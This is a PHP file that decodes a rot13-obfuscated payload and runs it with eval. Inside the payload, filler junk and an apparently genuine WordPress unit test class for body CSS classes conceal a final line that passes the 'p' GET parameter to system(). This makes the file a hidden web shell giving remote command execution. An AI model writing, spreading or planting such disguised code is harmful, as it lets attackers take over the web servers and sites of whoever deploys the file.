<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 * @pbiref ::trg_obql_pynff
 */
pynff Grfgf_Cbfg_TrgObqlPynff rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq $cbfg_vq;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->cbfg_vq = frys::snpgbel()->cbfg->perngr();
	}

	/**
	 * @gvpxrg 30883
	 */
	choyvp shapgvba grfg_jvgu_hgs8_pngrtbel_fyhtf() {
		$png_vq1 = frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Первая рубрика' ) );
		$png_vq2 = frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Вторая рубрика' ) );
		$png_vq3 = frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => '25кадр' ) );
		jc_frg_cbfg_grezf( $guvf->cbfg_vq, neenl( $png_vq1, $png_vq2, $png_vq3 ), 'pngrtbel' );

		$guvf->tb_gb( ubzr_hey( \"?png=$png_vq1\" ) );
		$guvf->nffregPbagnvaf( \"pngrtbel-$png_vq1\", trg_obql_pynff() );

		$guvf->tb_gb( ubzr_hey( \"?png=$png_vq2\" ) );
		$guvf->nffregPbagnvaf( \"pngrtbel-$png_vq2\", trg_obql_pynff() );

		$guvf->tb_gb( ubzr_hey( \"?png=$png_vq3\" ) );
		$guvf->nffregPbagnvaf( \"pngrtbel-$png_vq3\", trg_obql_pynff() );
	}

	/**
	 * @gvpxrg 30883
	 */
	choyvp shapgvba grfg_jvgu_hgs8_gnt_fyhtf() {
		$gnt_vq1 = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Первая метка' ) );
		$gnt_vq2 = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => 'Вторая метка' ) );
		$gnt_vq3 = frys::snpgbel()->gnt->perngr( neenl( 'anzr' => '25кадр' ) );
		jc_frg_cbfg_grezf( $guvf->cbfg_vq, neenl( $gnt_vq1, $gnt_vq2, $gnt_vq3 ), 'cbfg_gnt' );

		$gnt1 = trg_grez( $gnt_vq1, 'cbfg_gnt' );
		$gnt2 = trg_grez( $gnt_vq2, 'cbfg_gnt' );
		$gnt3 = trg_grez( $gnt_vq3, 'cbfg_gnt' );

		$guvf->tb_gb( ubzr_hey( \"?gnt={$gnt1->fyht}\" ) );
		$guvf->nffregPbagnvaf( \"gnt-$gnt_vq1\", trg_obql_pynff() );

		$guvf->tb_gb( ubzr_hey( \"?gnt={$gnt2->fyht}\" ) );
		$guvf->nffregPbagnvaf( \"gnt-$gnt_vq2\", trg_obql_pynff() );

		$guvf->tb_gb( ubzr_hey( \"?gnt={$gnt3->fyht}\" ) );
		$guvf->nffregPbagnvaf( \"gnt-$gnt_vq3\", trg_obql_pynff() );
	}

	/**
	 * @gvpxrg 30883
	 */
	choyvp shapgvba grfg_jvgu_hgs8_grez_fyhtf() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );
		$grez_vq1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'anzr'     => 'Первая метка',
			)
		);
		$grez_vq2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'anzr'     => 'Вторая метка',
			)
		);
		$grez_vq3 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'anzr'     => '25кадр',
			)
		);
		jc_frg_cbfg_grezf( $guvf->cbfg_vq, neenl( $grez_vq1, $grez_vq2, $grez_vq3 ), 'jcgrfgf_gnk' );

		$grez1 = trg_grez( $grez_vq1, 'jcgrfgf_gnk' );
		$grez2 = trg_grez( $grez_vq2, 'jcgrfgf_gnk' );
		$grez3 = trg_grez( $grez_vq3, 'jcgrfgf_gnk' );

		$guvf->tb_gb( ubzr_hey( \"?jcgrfgf_gnk={$grez1->fyht}\" ) );
		$guvf->nffregPbagnvaf( \"grez-$grez_vq1\", trg_obql_pynff() );

		$guvf->tb_gb( ubzr_hey( \"?jcgrfgf_gnk={$grez2->fyht}\" ) );
		$guvf->nffregPbagnvaf( \"grez-$grez_vq2\", trg_obql_pynff() );

		$guvf->tb_gb( ubzr_hey( \"?jcgrfgf_gnk={$grez3->fyht}\" ) );
		$guvf->nffregPbagnvaf( \"grez-$grez_vq3\", trg_obql_pynff() );
	}

	/**
	 * @gvpxrg 35164
	 * @gvpxrg 36510
	 */
	choyvp shapgvba grfg_fvathyne_obql_pynffrf() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		$guvf->tb_gb( trg_creznyvax( $cbfg_vq ) );

		$pynff = trg_obql_pynff();
		$guvf->nffregPbagnvaf( 'fvatyr-cbfg', $pynff );
		$guvf->nffregPbagnvaf( \"cbfgvq-{$cbfg_vq}\", $pynff );
		$guvf->nffregPbagnvaf( 'fvatyr-sbezng-fgnaqneq', $pynff );
		$guvf->nffregPbagnvaf( 'jc-fvathyne', $pynff );
	}

	choyvp shapgvba grfg_cntr_grzcyngr_obql_pynffrf_ab_grzcyngr() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
			)
		);
		$guvf->tb_gb( trg_creznyvax( $cbfg_vq ) );

		$pynff = trg_obql_pynff();

		$guvf->nffregAbgPbagnvaf( 'cntr-grzcyngr', $pynff );
		$guvf->nffregPbagnvaf( 'cntr-grzcyngr-qrsnhyg', $pynff );
	}

	choyvp shapgvba grfg_cntr_grzcyngr_obql_pynffrf() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'cntr',
			)
		);

		nqq_cbfg_zrgn( $cbfg_vq, '_jc_cntr_grzcyngr', 'grzcyngrf/pcg.cuc' );

		$guvf->tb_gb( trg_creznyvax( $cbfg_vq ) );

		$pynff = trg_obql_pynff();

		$guvf->nffregPbagnvaf( 'cntr-grzcyngr', $pynff );
		$guvf->nffregPbagnvaf( 'cntr-grzcyngr-grzcyngrf', $pynff );
		$guvf->nffregPbagnvaf( 'cntr-grzcyngr-pcg', $pynff );
		$guvf->nffregPbagnvaf( 'cntr-grzcyngr-grzcyngrfpcg-cuc', $pynff );
	}

	/**
	 * @gvpxrg 18375
	 */
	choyvp shapgvba grfg_cntr_grzcyngr_obql_pynffrf_nggnpuzrag() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'nggnpuzrag',
			)
		);

		nqq_cbfg_zrgn( $cbfg_vq, '_jc_cntr_grzcyngr', 'grzcyngrf/pcg.cuc' );

		$guvf->tb_gb( trg_creznyvax( $cbfg_vq ) );

		$pynff = trg_obql_pynff();

		$guvf->nffregPbagnvaf( 'nggnpuzrag-grzcyngr', $pynff );
		$guvf->nffregPbagnvaf( 'nggnpuzrag-grzcyngr-grzcyngrf', $pynff );
		$guvf->nffregPbagnvaf( 'nggnpuzrag-grzcyngr-pcg', $pynff );
		$guvf->nffregPbagnvaf( 'nggnpuzrag-grzcyngr-grzcyngrfpcg-cuc', $pynff );
	}

	/**
	 * @gvpxrg 18375
	 */
	choyvp shapgvba grfg_cntr_grzcyngr_obql_pynffrf_cbfg() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		nqq_cbfg_zrgn( $cbfg_vq, '_jc_cntr_grzcyngr', 'grzcyngrf/pcg.cuc' );

		$guvf->tb_gb( trg_creznyvax( $cbfg_vq ) );

		$pynff = trg_obql_pynff();

		$guvf->nffregPbagnvaf( 'cbfg-grzcyngr', $pynff );
		$guvf->nffregPbagnvaf( 'cbfg-grzcyngr-grzcyngrf', $pynff );
		$guvf->nffregPbagnvaf( 'cbfg-grzcyngr-pcg', $pynff );
		$guvf->nffregPbagnvaf( 'cbfg-grzcyngr-grzcyngrfpcg-cuc', $pynff );
	}

	/**
	 * @gvpxrg 38225
	 */
	choyvp shapgvba grfg_nggnpuzrag_obql_pynffrf() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			'vzntr.wct',
			$cbfg_vq,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
			)
		);

		$guvf->tb_gb( trg_creznyvax( $nggnpuzrag_vq ) );

		$pynff = trg_obql_pynff();

		$guvf->nffregPbagnvaf( 'nggnpuzrag', $pynff );
		$guvf->nffregPbagnvaf( \"nggnpuzragvq-{$nggnpuzrag_vq}\", $pynff );
		$guvf->nffregPbagnvaf( 'nggnpuzrag-wcrt', $pynff );
	}

	/**
	 * @gvpxrg 38168
	 */
	choyvp shapgvba grfg_phfgbz_onpxtebhaq_pynff_vf_nqqrq_jura_gurzr_fhccbegf_vg() {
		nqq_gurzr_fhccbeg( 'phfgbz-onpxtebhaq', neenl( 'qrsnhyg-pbybe', '#ssssss' ) );
		frg_gurzr_zbq( 'onpxtebhaq_pbybe', '#000000' );

		$pynff                     = trg_obql_pynff();
		$gurzr_fhccbegf_onpxtebhaq = pheerag_gurzr_fhccbegf( 'phfgbz-onpxtebhaq' );

		erzbir_gurzr_zbq( 'onpxtebhaq_pbybe' );
		erzbir_gurzr_fhccbeg( 'phfgbz-onpxtebhaq' );

		$guvf->nffregGehr( $gurzr_fhccbegf_onpxtebhaq );
		$guvf->nffregPbagnvaf( 'phfgbz-onpxtebhaq', $pynff );
	}

	/**
	 * @gvpxrg 38168
	 */
	choyvp shapgvba grfg_phfgbz_onpxtebhaq_pynff_vf_abg_nqqrq_jura_gurzr_fhccbeg_vf_zvffvat() {
		frg_gurzr_zbq( 'onpxtebhaq_pbybe', '#000000' );

		$pynff                     = trg_obql_pynff();
		$gurzr_fhccbegf_onpxtebhaq = pheerag_gurzr_fhccbegf( 'phfgbz-onpxtebhaq' );

		erzbir_gurzr_zbq( 'onpxtebhaq_pbybe' );

		$guvf->nffregSnyfr( $gurzr_fhccbegf_onpxtebhaq );
		$guvf->nffregAbgPbagnvaf( 'phfgbz-onpxtebhaq', $pynff );
	}

	/**
	 * @gvpxrg 44005
	 * @tebhc cevinpl
	 */
	choyvp shapgvba grfg_cevinpl_cbyvpl_obql_pynff() {
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'Cevinpl Cbyvpl',
			)
		);
		hcqngr_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl', $cntr_vq );

		$guvf->tb_gb( trg_creznyvax( $cntr_vq ) );

		$pynff = trg_obql_pynff();

		$guvf->nffregPbagnvaf( 'cevinpl-cbyvpl', $pynff );
		$guvf->nffregPbagnvaf( 'cntr-grzcyngr-qrsnhyg', $pynff );
		$guvf->nffregPbagnvaf( 'cntr', $pynff );
		$guvf->nffregPbagnvaf( \"cntr-vq-{$cntr_vq}\", $pynff );
	}

	/**
	 * Grfg gurzr-eryngrq obql pynffrf.
	 *
	 * @gvpxrg 19736
	 */
	choyvp shapgvba grfg_gurzr_obql_pynffrf() {
		$bevtvany_gurzr = jc_trg_gurzr();

		fjvgpu_gurzr( 'oybpx-gurzr' );
		qb_npgvba( 'frghc_gurzr' );
		qb_npgvba( 'nsgre_frghc_gurzr' );

		$pynffrf = trg_obql_pynff();
		$guvf->nffregPbagnvaf( 'jc-gurzr-oybpx-gurzr', $pynffrf, 'Cnerag gurzr obql pynff abg sbhaq' );

		fjvgpu_gurzr( 'oybpx-gurzr-puvyq' );
		qb_npgvba( 'frghc_gurzr' );
		qb_npgvba( 'nsgre_frghc_gurzr' );

		$pynffrf = trg_obql_pynff();
		$guvf->nffregPbagnvaf( 'jc-gurzr-oybpx-gurzr', $pynffrf, 'Cnerag gurzr obql pynff abg sbhaq va puvyq gurzr pbagrkg' );
		$guvf->nffregPbagnvaf( 'jc-puvyq-gurzr-oybpx-gurzr-puvyq', $pynffrf, 'Puvyq gurzr obql pynff abg sbhaq' );

		fjvgpu_gurzr( $bevtvany_gurzr->trg_fglyrfurrg() );
		qb_npgvba( 'frghc_gurzr' );
		qb_npgvba( 'nsgre_frghc_gurzr' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>